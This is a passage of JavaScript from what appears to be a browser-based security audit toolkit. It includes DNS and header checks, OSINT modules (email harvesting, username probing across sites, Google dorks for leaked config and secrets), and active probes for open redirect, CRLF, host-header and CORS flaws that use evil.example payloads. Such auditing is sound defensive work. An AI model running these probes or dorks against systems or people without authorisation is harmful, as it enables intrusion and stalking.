      { label:'DKIM',  name:'default._domainkey.'+inp.domain, type:'TXT' },
    ];
    var findings = [];
    var rows = [];
    for (var i = 0; i < checks.length; i++){
      var c = checks[i];
      var d = await dohQuery(c.name, c.type);
      var answers = (d && d.Answer) || [];
      var txt = answers.map(function(a){return a.data;}).filter(function(x){ return x && x.indexOf('v=') !== -1; });
      rows.push({ label:c.label, values:txt });
      if (!txt.length){
        findings.push({
          severity: c.label === 'SPF' ? 'medium' : (c.label === 'DMARC' ? 'high' : 'low'),
          cwe:'CWE-290',
          title: c.label + ' record missing',
          desc: 'No ' + c.label + ' record found for ' + inp.domain + '.',
          evidence: c.name + ' TXT → (empty)',
          remediation: c.label === 'SPF'
            ? 'Add a TXT record: v=spf1 include:... -all'
            : (c.label === 'DMARC' ? 'Add a TXT record at _dmarc: v=DMARC1; p=reject;'
                                    : 'Add DKIM TXT records at selector._domainkey.'),
        });
      }
    }
    var html = rows.map(function(r){
      return '<div class="result-kv"><span class="k">'+r.label+'</span>'
        + '<span class="v">' + (r.values.length ? r.values.map(esc).join('<br>')
                                                 : '<span style="color:#f87171">missing</span>')
        + '</span></div>';
    }).join('');
    return { html: html, findings: findings };
  },
});

reg('network', {
  id: 'reverse_dns', icon: '↩️', name: 'Reverse DNS',
  description: 'PTR lookup for an IP address',
  fields: [{ name:'ip', label:'IP address', placeholder:'1.1.1.1' }],
  auto: function(){ return { ip:'' }; },
  run: async function(inp){
    if (!inp.ip) throw new Error('IP required');
    var parts = inp.ip.split('.').reverse().join('.');
    var d = await dohQuery(parts + '.in-addr.arpa', 'PTR');
    var answers = (d && d.Answer) || [];
    if (!answers.length) return { html:'<div class="result-msg info">No PTR records.</div>' };
    return { html: answers.map(function(a){
      return '<div class="result-kv"><span class="k">PTR</span><span class="v">'+esc(a.data)+'</span></div>';
    }).join('') };
  },
});

reg('network', {
  id: 'http_latency', icon: '⏱️', name: 'HTTP Latency',
  description: 'Measure round-trip time through the proxy',
  fields: [
    { name:'url', label:'URL', placeholder:'https://example.com' },
    { name:'count', label:'Sample count', type:'number', default:'5' },
  ],
  auto: function(){ return { url: L.activeTabUrl(), count:'5' }; },
  run: async function(inp){
    if (!inp.url) throw new Error('URL required');
    var n = Math.max(1, Math.min(20, parseInt(inp.count||'5', 10)));
    var times = [];
    for (var i = 0; i < n; i++){
      var t0 = performance.now();
      try { await fetch(proxiedUrl(inp.url), {method:'HEAD', credentials:'same-origin'}); }
      catch(e){}
      times.push(Math.round(performance.now() - t0));
    }
    var min = Math.min.apply(null, times);
    var max = Math.max.apply(null, times);
    var avg = Math.round(times.reduce(function(a,b){return a+b;},0) / times.length);
    var html = '<div class="result-kv"><span class="k">Samples</span><span class="v">'+times.join(' ms · ')+' ms</span></div>'
      + '<div class="result-kv"><span class="k">Min</span><span class="v">'+min+' ms</span></div>'
      + '<div class="result-kv"><span class="k">Max</span><span class="v">'+max+' ms</span></div>'
      + '<div class="result-kv"><span class="k">Avg</span><span class="v">'+avg+' ms</span></div>';
    return { html: html };
  },
});

// ---------------- OSINT ----------------
reg('osint', {
  id: 'harvester', icon: '🌾', name: 'theHarvester-lite',
  description: 'Extract emails + subdomains from the current page',
  fields: [{ name:'url', label:'Page URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('URL required');
    var r = await fetchText(proxiedUrl(inp.url));
    var body = r.body || '';
    var emails = Array.from(new Set((body.match(/[\w.+\-]+@[\w\-]+\.[\w.\-]+/g)||[])
      .filter(function(e){ return !e.match(/\.(png|jpg|jpeg|gif|svg|webp|css|js)$/i); })));
    var host = ''; try { host = new URL(inp.url).hostname; } catch(e){}
    var subs = Array.from(new Set((body.match(/https?:\/\/([\w\-]+\.)+[\w\-]+/g)||[])
      .map(function(u){ try { return new URL(u).hostname; } catch(e){ return null; } })
      .filter(function(h){ return h && host && h.endsWith(host); })));
    var html = '<div class="result-kv"><span class="k">Emails</span><span class="v">'
      + (emails.length ? emails.map(esc).join('<br>') : '<span style="color:#64748b">(none)</span>')
      + '</span></div>'
      + '<div class="result-kv"><span class="k">Subdomains</span><span class="v">'
      + (subs.length ? subs.map(esc).join('<br>') : '<span style="color:#64748b">(none)</span>')
      + '</span></div>';
    return { html: html };
  },
});

reg('osint', {
  id: 'sherlock', icon: '🔍', name: 'Username Check',
  description: 'Probe 12 popular sites for a username',
  fields: [{ name:'username', label:'Username', placeholder:'johndoe' }],
  auto: function(){ return { username:'' }; },
  run: async function(inp){
    if (!inp.username) throw new Error('username required');
    var sites = [
      { name:'GitHub',   url:'https://github.com/' },
      { name:'Twitter',  url:'https://twitter.com/' },
      { name:'Instagram',url:'https://www.instagram.com/' },
      { name:'Reddit',   url:'https://www.reddit.com/user/' },
      { name:'Medium',   url:'https://medium.com/@' },
      { name:'Dev.to',   url:'https://dev.to/' },
      { name:'Keybase',  url:'https://keybase.io/' },
      { name:'Docker Hub',url:'https://hub.docker.com/u/' },
      { name:'Pinterest',url:'https://www.pinterest.com/' },
      { name:'Telegram', url:'https://t.me/' },
      { name:'SoundCloud',url:'https://soundcloud.com/' },
      { name:'Patreon',  url:'https://www.patreon.com/' },
    ];
    var results = [];
    for (var i = 0; i < sites.length; i++){
      var s = sites[i];
      var full = s.url + encodeURIComponent(inp.username);
      try {
        var r = await fetchText(proxiedUrl(full), { method:'HEAD' });
        results.push({ site:s.name, url:full, status:r.status, found: r.status === 200 });
      } catch(e){ results.push({ site:s.name, url:full, status:0, found:false }); }
    }
    var html = results.map(function(x){
      return '<div class="result-list-item">'
        + '<span class="badge" style="background:'+(x.found?'rgba(16,185,129,.15)':'rgba(100,116,139,.15)')
        + ';color:'+(x.found?'#10b981':'#64748b')+'">'+(x.found?'FOUND':'—')+'</span>'
        + '<a href="'+esc(x.url)+'" target="_blank">'+esc(x.site)+'</a>'
        + '<span style="color:#64748b;font-size:11px">'+x.status+'</span></div>';
    }).join('');
    return { html: html };
  },
});

reg('osint', {
  id: 'dorker', icon: '🔍', name: 'Google Dork Builder',
  description: 'Generate ready-to-use dorks for a target',
  fields: [{ name:'host', label:'Domain or URL', placeholder:'example.com' }],
  auto: function(){ return { host: L.activeTabHost() }; },
  run: async function(inp){
    if (!inp.host) throw new Error('host required');
    var h = inp.host.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
    var dorks = [
      ['Login pages',       'site:'+h+' inurl:login OR inurl:signin OR inurl:admin'],
      ['Config files',      'site:'+h+' ext:xml OR ext:conf OR ext:cnf OR ext:reg OR ext:inf OR ext:rdp OR ext:cfg OR ext:txt OR ext:ora OR ext:ini'],
      ['DB backups',        'site:'+h+' ext:sql OR ext:dbf OR ext:mdb'],
      ['Backup files',      'site:'+h+' ext:bkf OR ext:bkp OR ext:bak OR ext:old OR ext:backup'],
      ['Log files',         'site:'+h+' ext:log'],
      ['Excel / docs',      'site:'+h+' ext:xls OR ext:xlsx OR ext:csv OR ext:doc OR ext:docx OR ext:pdf'],
      ['Directory listing', 'site:'+h+' intitle:"index of"'],
      ['Public env files',  'site:'+h+' ext:env'],
      ['Swagger',           'site:'+h+' inurl:swagger OR inurl:api-docs OR inurl:openapi'],
      ['phpMyAdmin',        'site:'+h+' inurl:phpmyadmin OR inurl:pma'],
      ['WordPress exposed', 'site:'+h+' inurl:wp-content OR inurl:wp-includes'],
      ['S3 buckets',        'site:s3.amazonaws.com "'+h+'"'],
      ['GitHub leaks',      'site:github.com "'+h+'" password OR secret OR token'],
      ['Pastebin',          'site:pastebin.com "'+h+'"'],
    ];
    var html = dorks.map(function(d){
      var url = 'https://www.google.com/search?q='+encodeURIComponent(d[1]);
      return '<div class="result-list-item">'
        + '<a href="'+esc(url)+'" target="_blank" title="'+esc(d[1])+'">'
        + '<strong>'+esc(d[0])+'</strong> · <span style="color:#94a3b8">'+esc(d[1].slice(0,80))+'</span></a>'
        + '<button class="btn small" data-copy="'+esc(d[1])+'">⧉</button></div>';
    }).join('');
    setTimeout(function(){
      document.querySelectorAll('#kit-main button[data-copy]').forEach(function(b){
        b.onclick = function(){
          navigator.clipboard.writeText(b.dataset.copy);
          toast('Dork copied');
        };
      });
    }, 0);
    return { html: html };
  },
});

reg('osint', {
  id: 'email_verify', icon: '✉️', name: 'Email Verifier',
  description: 'Syntax check + MX record existence',
  fields: [{ name:'email', label:'Email', placeholder:'user@example.com' }],
  auto: function(){ return { email:'' }; },
  run: async function(inp){
    if (!inp.email) throw new Error('email required');
    var ok = /^[\w.+\-]+@([\w\-]+\.)+[A-Za-z]{2,}$/.test(inp.email);
    var parts = inp.email.split('@');
    var domain = parts[1] || '';
    var mxData = domain ? await dohQuery(domain, 'MX') : null;
    var mxs = (mxData && mxData.Answer) || [];
    return {
      html: '<div class="result-kv"><span class="k">Syntax</span><span class="v">'
        + (ok ? '<span style="color:#10b981">valid</span>' : '<span style="color:#f87171">invalid</span>')
        + '</span></div>'
        + '<div class="result-kv"><span class="k">Domain</span><span class="v">'+esc(domain)+'</span></div>'
        + '<div class="result-kv"><span class="k">MX records</span><span class="v">'
        + (mxs.length ? mxs.map(function(m){return esc(m.data);}).join('<br>')
                      : '<span style="color:#f87171">none — cannot deliver</span>')
        + '</span></div>',
    };
  },
});

// ---------------- WEB ----------------
reg('web', {
  id: 'sec_headers', icon: '🛡️', name: 'Security Headers',
  description: 'Audit response headers for missing/weak protections',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('URL required');
    var r = await fetchText(proxiedUrl(inp.url), { method:'HEAD' });
    var H = {};
    r.headers.forEach(function(v,k){ H[k.toLowerCase()] = v; });
    var checks = [
      ['strict-transport-security','medium','HSTS','Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload'],
      ['content-security-policy','high','CSP','Add a strict Content-Security-Policy'],
      ['x-frame-options','medium','X-Frame-Options','Add X-Frame-Options: DENY or CSP frame-ancestors'],
      ['x-content-type-options','low','X-Content-Type-Options','Add X-Content-Type-Options: nosniff'],
      ['referrer-policy','low','Referrer-Policy','Add Referrer-Policy: strict-origin-when-cross-origin'],
      ['permissions-policy','low','Permissions-Policy','Restrict browser features with Permissions-Policy'],
      ['cross-origin-opener-policy','low','COOP','Add Cross-Origin-Opener-Policy: same-origin'],
    ];
    var findings = [];
    var rows = [];
    checks.forEach(function(c){
      var present = !!H[c[0]];
      rows.push('<div class="result-kv"><span class="k">'+esc(c[2])+'</span>'
        + '<span class="v">' + (present
            ? '<span style="color:#10b981">'+esc(String(H[c[0]]).slice(0,120))+'</span>'
            : '<span style="color:#f87171">missing</span>')
        + '</span></div>');
      if (!present){
        findings.push({ severity:c[1], cwe:'CWE-693',
          title:'Missing '+c[2], desc:c[2]+' header absent',
          evidence:c[0]+' (absent)', remediation:c[3],
          tabUrl:inp.url });
      }
    });
    return { html: rows.join(''), findings: findings };
  },
});

reg('web', {
  id: 'cookie_client', icon: '🍪', name: 'Cookie Flags',
  description: 'Read Set-Cookie headers and flag missing protections',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('URL required');
    var r = await fetchText(proxiedUrl(inp.url), { method:'HEAD' });
    var sc = r.headers.get('set-cookie') || '';
    if (!sc) return { html:'<div class="result-msg info">No Set-Cookie headers.</div>' };
    var parts = sc.split(/,(?=[^;=]+=)/);
    var findings = [];
    var html = parts.map(function(p){
      p = p.trim();
      var flags = p.toLowerCase();
      var name = p.split('=')[0];
      var missing = [];
      if (inp.url.startsWith('https') && flags.indexOf('secure') === -1) missing.push('Secure');
      if (flags.indexOf('httponly') === -1) missing.push('HttpOnly');
      if (flags.indexOf('samesite') === -1) missing.push('SameSite');
      if (missing.length){
        findings.push({
          severity:'medium', cwe:'CWE-1004',
          title:'Cookie '+name+' missing '+missing.join(', '),
          desc:'Cookie lacks security flags.',
          evidence:p.slice(0,200),
          remediation:'Add '+missing.join(', ')+' to the Set-Cookie header.',
          tabUrl:inp.url,
        });
      }
      return '<div class="result-kv"><span class="k">'+esc(name.slice(0,30))+'</span>'
        + '<span class="v">' + (missing.length
            ? '<span style="color:#f87171">missing: '+esc(missing.join(', '))+'</span>'
            : '<span style="color:#10b981">all flags set</span>')
        + '<br><span style="color:#64748b;font-size:11px">'+esc(p.slice(0,140))+'</span>'
        + '</span></div>';
    }).join('');
    return { html: html, findings: findings };
  },
});

reg('web', {
  id: 'open_redirect', icon: '➡️', name: 'Open Redirect',
  description: 'Probe common redirect params',
  fields: [{ name:'url', label:'URL with param', placeholder:'https://example.com/login?next=' }],
  auto: function(){
    var u = L.activeTabUrl();
    return { url: u.indexOf('?') === -1 ? u + '?next=' : u };
  },
  run: async function(inp){
    if (!inp.url) throw new Error('URL required');
    var payloads = ['https://evil.example','//evil.example','/\\evil.example','https:evil.example'];
    var rows = [];
    var findings = [];
    for (var i = 0; i < payloads.length; i++){
      var p = payloads[i];
      var testUrl = inp.url + encodeURIComponent(p);
      try {
        var r = await fetchText(proxiedUrl(testUrl), { method:'HEAD', redirect: 'manual' });
        var loc = r.headers.get('location') || '';
        var hit = loc.indexOf('evil.example') !== -1;
        if (hit){
          findings.push({
            severity:'medium', cwe:'CWE-601',
            title:'Open redirect via '+inp.url,
            desc:'Server redirects to attacker-controlled host.',
            evidence:'Location: '+loc,
            remediation:'Validate redirect URLs against an allowlist.',
            tabUrl:inp.url,
          });
        }
        rows.push('<div class="result-kv"><span class="k">'+esc(p.slice(0,20))+'</span>'
          + '<span class="v">'+r.status+' → '+esc(loc||'(no redirect)')+'</span></div>');
      } catch(e){
        rows.push('<div class="result-kv"><span class="k">'+esc(p.slice(0,20))+'</span>'
          + '<span class="v" style="color:#f87171">'+esc(String(e))+'</span></div>');
      }
    }
    return { html: rows.join(''), findings: findings };
  },
});

reg('web', {
  id: 'subdomain_takeover', icon: '🎯', name: 'Subdomain Takeover',
  description: 'Check CNAMEs against known dangling services',
  fields: [{ name:'subdomains', label:'Subdomains (one per line)', type:'textarea',
    placeholder:'blog.example.com\nshop.example.com' }],
  auto: function(){ return { subdomains: L.activeTabHost() }; },
  run: async function(inp){
    if (!inp.subdomains) throw new Error('list required');
    var subs = inp.subdomains.split('\n').map(function(s){return s.trim();}).filter(Boolean);
    var fingerprints = [
      { svc:'GitHub Pages',  match:/github\.io$/i },
      { svc:'Heroku',        match:/herokuapp\.com$/i },
      { svc:'Netlify',       match:/netlify\.app$/i },
      { svc:'Vercel',        match:/vercel\.app$/i },
      { svc:'AWS S3',        match:/s3\.amazonaws\.com$/i },
      { svc:'Azure',         match:/azurewebsites\.net$/i },
      { svc:'Shopify',       match:/myshopify\.com$/i },
      { svc:'Fastly',        match:/fastly\.net$/i },
      { svc:'Zendesk',       match:/zendesk\.com$/i },
      { svc:'Tumblr',        match:/tumblr\.com$/i },
    ];
    var findings = [];
    var rows = [];
    for (var i = 0; i < subs.length; i++){
      var sub = subs[i];
      var cname = await dohQuery(sub, 'CNAME');
      var target = (cname && cname.Answer && cname.Answer[0] && cname.Answer[0].data) || '';
      var fp = fingerprints.find(function(f){ return f.match.test(target); });
      var row = '<div class="result-kv"><span class="k">'+esc(sub.slice(0,24))+'</span>'
        + '<span class="v">' + (target ? esc(target) : '<span style="color:#64748b">no CNAME</span>');
      if (fp){
        row += ' <span style="color:#f59e0b">⚠ possible '+fp.svc+'</span>';
        findings.push({
          severity:'high', cwe:'CWE-350',
          title:'Possible subdomain takeover: '+sub,
          desc:'CNAME points to '+fp.svc+'. If the target no longer exists, an attacker can claim it.',
          evidence:'CNAME → '+target,
          remediation:'Verify the target service still owns this subdomain; remove the DNS record if not.',
          tabUrl:sub,
        });
      }
      row += '</span></div>';
      rows.push(row);
    }
    return { html: rows.join(''), findings: findings };
  },
});

// ---------------- CMS ----------------
function cmsScanner(id, name, icon, checks){
  reg('cms', {
    id: id, icon: icon, name: name,
    description: 'Probe common '+name+' endpoints',
    fields: [{ name:'base', label:'Base URL', placeholder:'https://example.com' }],
    auto: function(){ return { base: L.activeTabOrigin() }; },
    run: async function(inp){
      if (!inp.base) throw new Error('base URL required');
      var findings = [];
      var rows = [];
      for (var i = 0; i < checks.length; i++){
        var c = checks[i];
        var u = inp.base + c.path;
        try {
          var r = await fetchText(proxiedUrl(u), { method: 'HEAD' });
          if (r.status === 200 || r.status === 403){
            rows.push('<div class="result-list-item">'
              + '<span class="badge">'+r.status+'</span>'
              + '<a href="'+esc(u)+'" target="_blank">'+esc(c.path)+'</a></div>');
            if (c.severity){
              findings.push({
                severity:c.severity, cwe:c.cwe || 'CWE-200',
                title: c.path + ' exposed ('+r.status+')',
                desc:'Endpoint is reachable.',
                evidence:u,
                remediation:c.remediation || 'Restrict access to this endpoint.',
                tabUrl:inp.base,
              });
            }
          }
        } catch(e){}
      }
      return {
        html: rows.length ? rows.join('')
                          : '<div class="result-msg info">No endpoints matched.</div>',
        findings: findings,
      };
    },
  });
}

cmsScanner('wp_scan','WordPress Scanner','🅆', [
  { path:'/wp-login.php',        severity:null },
  { path:'/wp-admin/',           severity:null },
  { path:'/xmlrpc.php',          severity:'medium', cwe:'CWE-16',
    remediation:'Disable XML-RPC if not needed.' },
  { path:'/wp-json/wp/v2/users', severity:'high', cwe:'CWE-200',
    remediation:'Restrict REST API user listing.' },
  { path:'/wp-content/debug.log',severity:'high', cwe:'CWE-532',
    remediation:'Delete debug logs from production.' },
  { path:'/readme.html',         severity:'low', cwe:'CWE-200',
    remediation:'Remove readme.html.' },
  { path:'/wp-config.php.bak',   severity:'critical', cwe:'CWE-538',
    remediation:'Delete backup config from web root.' },
  { path:'/?author=1',           severity:'medium', cwe:'CWE-200',
    remediation:'Disable author enumeration.' },
]);

cmsScanner('joomla_scan','Joomla Scanner','🅹', [
  { path:'/administrator/',      severity:null },
  { path:'/configuration.php~',  severity:'critical', cwe:'CWE-538',
    remediation:'Delete editor backup files.' },
  { path:'/htaccess.txt',        severity:'low', cwe:'CWE-200' },
  { path:'/administrator/manifests/files/joomla.xml', severity:'medium', cwe:'CWE-200' },
  { path:'/README.txt',          severity:'low', cwe:'CWE-200' },
]);

cmsScanner('drupal_scan','Drupal Scanner','🅳', [
  { path:'/CHANGELOG.txt',       severity:'medium', cwe:'CWE-200' },
  { path:'/core/CHANGELOG.txt',  severity:'medium', cwe:'CWE-200' },
  { path:'/user/login',          severity:null },
  { path:'/user/register',       severity:'low', cwe:'CWE-16',
    remediation:'Disable public registration if not needed.' },
  { path:'/sites/default/settings.php', severity:'critical', cwe:'CWE-538',
    remediation:'Ensure settings.php is not served.' },
  { path:'/sites/default/files/',severity:'medium', cwe:'CWE-548',
    remediation:'Disable directory listing on files/.' },
]);

// ---------------- VULN PROBES ----------------
reg('webvuln', {
  id: 'csp_client', icon: '🔐', name: 'CSP Analyzer',
  description: 'Inspect Content-Security-Policy for weak directives',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('URL required');
    var r = await fetchText(proxiedUrl(inp.url), { method:'HEAD' });
    var csp = r.headers.get('content-security-policy') || '';
    if (!csp) return { html:'<div class="result-msg warn">No CSP header.</div>' };
    var findings = [];
    if (/'unsafe-inline'/.test(csp)){
      findings.push({ severity:'high', cwe:'CWE-79',
        title:"CSP allows 'unsafe-inline'",
        desc:'Inline scripts can execute.',
        evidence:csp.slice(0,300),
        remediation:"Use nonces or hashes instead.",
        tabUrl:inp.url });
    }
    if (/'unsafe-eval'/.test(csp)){
      findings.push({ severity:'high', cwe:'CWE-95',
        title:"CSP allows 'unsafe-eval'",
        desc:'eval and Function allowed.',
        evidence:csp.slice(0,300),
        remediation:'Remove unsafe-eval.',
        tabUrl:inp.url });
    }
    if (/script-src[^;]*\*/.test(csp)){
      findings.push({ severity:'medium', cwe:'CWE-79',
        title:'script-src wildcard',
        desc:'Scripts loaded from any origin.',
        evidence:csp.slice(0,300),
        remediation:'Restrict to specific hosts.',
        tabUrl:inp.url });
    }
    return {
      html: '<div class="result-kv"><span class="k">CSP</span>'
        + '<span class="v" style="font-size:11.5px">'+esc(csp.slice(0,600))+'</span></div>',
      findings: findings,
    };
  },
});

reg('webvuln', {
  id: 'crlf', icon: '↩️', name: 'CRLF Injection',
  description: 'Probe for header-injection via encoded CRLF',
  fields: [{ name:'url', label:'URL with param', placeholder:'https://example.com/?x=' }],
  auto: function(){
    var u = L.activeTabUrl();
    return { url: u.indexOf('?') === -1 ? u + '?x=' : u };
  },
  run: async function(inp){
    if (!inp.url) throw new Error('URL required');
    var pls = ['%0d%0aX-Injected:lynk','%0aX-Injected:lynk','\\r\\nX-Injected:lynk'];
    var rows = [], findings = [];
    for (var i = 0; i < pls.length; i++){
      var u = inp.url + pls[i];
      try {
        var r = await fetchText(proxiedUrl(u), { method:'HEAD' });
        var injected = !!r.headers.get('x-injected');
        if (injected){
          findings.push({
            severity:'high', cwe:'CWE-113',
            title:'CRLF Injection',
            desc:'Response contains an injected header.',
            evidence:'Payload: '+pls[i]+'\nX-Injected: '+r.headers.get('x-injected'),
            remediation:'Sanitize user input before setting headers.',
            tabUrl:inp.url,
          });
        }
        rows.push('<div class="result-kv"><span class="k">'+esc(pls[i].slice(0,20))+'</span>'
          + '<span class="v">'+r.status+' · x-injected='+(injected?'YES':'no')+'</span></div>');
      } catch(e){}
    }
    return { html: rows.join(''), findings: findings };
  },
});

reg('webvuln', {
  id: 'host_hdr', icon: '🏠', name: 'Host Header Injection',
  description: 'Test X-Forwarded-Host reflection',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('URL required');
    var hdrs = ['X-Forwarded-Host','X-Host','X-Forwarded-Server','Forwarded'];
    var rows = [], findings = [];
    for (var i = 0; i < hdrs.length; i++){
      try {
        var r = await fetchText(proxiedUrl(inp.url), {
          headers: (function(){ var o = {}; o[hdrs[i]] = 'evil.example'; return o; })()
        });
        var reflected = r.body.indexOf('evil.example') !== -1;
        if (reflected){
          findings.push({
            severity:'high', cwe:'CWE-644',
            title:'Host header reflected: '+hdrs[i],
            desc:'Header value echoed into response body.',
            evidence:hdrs[i]+': evil.example',
            remediation:'Ignore untrusted headers; use a hard-coded host or allowlist.',
            tabUrl:inp.url,
          });
        }
        rows.push('<div class="result-kv"><span class="k">'+esc(hdrs[i].slice(0,22))+'</span>'
          + '<span class="v">'+(reflected ? '<span style="color:#f87171">reflected</span>'
                                          : '<span style="color:#10b981">not reflected</span>')+'</span></div>');
      } catch(e){}
    }
    return { html: rows.join(''), findings: findings };
  },
});

reg('webvuln', {
  id: 'cors_client', icon: '🌍', name: 'CORS Audit',
  description: 'Test CORS behaviour across origins',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('URL required');
    var tests = ['https://evil.example','null'];
    var rows = [], findings = [];
    for (var i = 0; i < tests.length; i++){
      var o = tests[i];
      try {
        var r = await fetchText(proxiedUrl(inp.url), { headers: { 'Origin': o } });
        var acao = r.headers.get('access-control-allow-origin') || '';
        var acac = (r.headers.get('access-control-allow-credentials')||'').toLowerCase();
        var hit = acao === o || acao === '*';
        if (hit && acac === 'true'){
          findings.push({
            severity: acao === '*' ? 'critical' : 'high', cwe:'CWE-942',
            title:'CORS misconfiguration: '+o,
            desc: acao === '*' ? 'Wildcard with credentials.' : 'Origin reflected with credentials.',
            evidence:'ACAO: '+acao+'\nACAC: '+acac,
            remediation:'Use a strict allowlist; never combine * with credentials.',
            tabUrl:inp.url,
          });
        }
        rows.push('<div class="result-kv"><span class="k">'+esc(o)+'</span>'
          + '<span class="v">ACAO: '+esc(acao||'(none)')+' · ACAC: '+esc(acac||'(none)')+'</span></div>');
      } catch(e){}
    }
    return { html: rows.join(''), findings: findings };
  },
});

// ---------------- ENCODE ----------------
function md5(str){
  function rl(n,c){return (n<<c)|(n>>>(32-c));}
  function au(x,y){var l=(x&0xFFFF)+(y&0xFFFF);var m=(x>>16)+(y>>16)+(l>>16);return (m<<16)|(l&0xFFFF);}
  function cmn(q,a,b,x,s,t){return au(rl(au(au(a,q),au(x,t)),s),b);}
  function ff(a,b,c,d,x,s,t){return cmn((b&c)|((~b)&d),a,b,x,s,t);}
  function gg(a,b,c,d,x,s,t){return cmn((b&d)|(c&(~d)),a,b,x,s,t);}
  function hh(a,b,c,d,x,s,t){return cmn(b^c^d,a,b,x,s,t);}
  function ii(a,b,c,d,x,s,t){return cmn(c^(b|(~d)),a,b,x,s,t);}
  function sb(s){var n=((s.length+8)>>6)+1;var b=new Array(n*16);for(var i=0;i<n*16;i++)b[i]=0;for(var j=0;j<s.length;j++)b[j>>2]|=s.charCodeAt(j)<<((j%4)*8);b[s.length>>2]|=0x80<<((s.length%4)*8);b[n*16-2]=s.length*8;return b;}
  var s = unescape(encodeURIComponent(str));
  var x = sb(s);
  var a=1732584193,b=-271733879,c=-1732584194,d=271733878;
  for (var i=0;i<x.length;i+=16){
    var oa=a,ob=b,oc=c,od=d;
    a=ff(a,b,c,d,x[i+0],7,-680876936); d=ff(d,a,b,c,x[i+1],12,-389564586);
    c=ff(c,d,a,b,x[i+2],17,606105819); b=ff(b,c,d,a,x[i+3],22,-1044525330);
    a=ff(a,b,c,d,x[i+4],7,-176418897); d=ff(d,a,b,c,x[i+5],12,1200080426);
    c=ff(c,d,a,b,x[i+6],17,-1473231341); b=ff(b,c,d,a,x[i+7],22,-45705983);
    a=ff(a,b,c,d,x[i+8],7,1770035416); d=ff(d,a,b,c,x[i+9],12,-1958414417);
    c=ff(c,d,a,b,x[i+10],17,-42063); b=ff(b,c,d,a,x[i+11],22,-1990404162);
    a=ff(a,b,c,d,x[i+12],7,1804603682); d=ff(d,a,b,c,x[i+13],12,-40341101);
    c=ff(c,d,a,b,x[i+14],17,-1502002290); b=ff(b,c,d,a,x[i+15],22,1236535329);
    a=gg(a,b,c,d,x[i+1],5,-165796510); d=gg(d,a,b,c,x[i+6],9,-1069501632);
    c=gg(c,d,a,b,x[i+11],14,643717713); b=gg(b,c,d,a,x[i+0],20,-373897302);
    a=gg(a,b,c,d,x[i+5],5,-701558691); d=gg(d,a,b,c,x[i+10],9,38016083);
    c=gg(c,d,a,b,x[i+15],14,-660478335); b=gg(b,c,d,a,x[i+4],20,-405537848);
    a=gg(a,b,c,d,x[i+9],5,568446438); d=gg(d,a,b,c,x[i+14],9,-1019803690);
    c=gg(c,d,a,b,x[i+3],14,-187363961); b=gg(b,c,d,a,x[i+8],20,1163531501);
    a=gg(a,b,c,d,x[i+13],5,-1444681467); d=gg(d,a,b,c,x[i+2],9,-51403784);
    c=gg(c,d,a,b,x[i+7],14,1735328473); b=gg(b,c,d,a,x[i+12],20,-1926607734);
    a=hh(a,b,c,d,x[i+5],4,-378558); d=hh(d,a,b,c,x[i+8],11,-2022574463);
    c=hh(c,d,a,b,x[i+11],16,1839030562); b=hh(b,c,d,a,x[i+14],23,-35309556);
    a=hh(a,b,c,d,x[i+1],4,-1530992060); d=hh(d,a,b,c,x[i+4],11,1272893353);
    c=hh(c,d,a,b,x[i+7],16,-155497632); b=hh(b,c,d,a,x[i+10],23,-1094730640);
    a=hh(a,b,c,d,x[i+13],4,681279174); d=hh(d,a,b,c,x[i+0],11,-358537222);
    c=hh(c,d,a,b,x[i+3],16,-722521979); b=hh(b,c,d,a,x[i+6],23,76029189);
    a=hh(a,b,c,d,x[i+9],4,-640364487); d=hh(d,a,b,c,x[i+12],11,-421815835);
    c=hh(c,d,a,b,x[i+15],16,530742520); b=hh(b,c,d,a,x[i+2],23,-995338651);
    a=ii(a,b,c,d,x[i+0],6,-198630844); d=ii(d,a,b,c,x[i+7],10,1126891415);
    c=ii(c,d,a,b,x[i+14],15,-1416354905); b=ii(b,c,d,a,x[i+5],21,-57434055);
    a=ii(a,b,c,d,x[i+12],6,1700485571); d=ii(d,a,b,c,x[i+3],10,-1894986606);
    c=ii(c,d,a,b,x[i+10],15,-1051523); b=ii(b,c,d,a,x[i+1],21,-2054922799);
    a=ii(a,b,c,d,x[i+8],6,1873313359); d=ii(d,a,b,c,x[i+15],10,-30611744);
    c=ii(c,d,a,b,x[i+6],15,-1560198380); b=ii(b,c,d,a,x[i+13],21,1309151649);
    a=ii(a,b,c,d,x[i+4],6,-145523070); d=ii(d,a,b,c,x[i+11],10,-1120210379);
    c=ii(c,d,a,b,x[i+2],15,718787259); b=ii(b,c,d,a,x[i+9],21,-343485551);
    a=au(a,oa); b=au(b,ob); c=au(c,oc); d=au(d,od);
  }
  function hx(n){
    var s=''; for(var i=0;i<4;i++) s += ('0'+((n>>(i*8))&0xFF).toString(16)).slice(-2);
    return s;
  }
  return hx(a)+hx(b)+hx(c)+hx(d);
}

reg('encode', {
  id: 'hasher', icon: '#️⃣', name: 'Hash Generator',
  description: 'MD5, SHA-1, SHA-256, SHA-512',
  fields: [{ name:'text', label:'Text', type:'textarea', placeholder:'any string' }],
  auto: function(){ return { text:'' }; },
  run: async function(inp){
    if (!inp.text) throw new Error('text required');
    var enc = new TextEncoder().encode(inp.text);
    var algs = ['SHA-1','SHA-256','SHA-512'];
    var rows = [];
    rows.push('<div class="result-kv"><span class="k">MD5</span><span class="v">'+md5(inp.text)+'</span></div>');
    for (var i = 0; i < algs.length; i++){
      var a = algs[i];
      var buf = await crypto.subtle.digest(a, enc);
      var hex = Array.from(new Uint8Array(buf)).map(function(b){return b.toString(16).padStart(2,'0');}).join('');
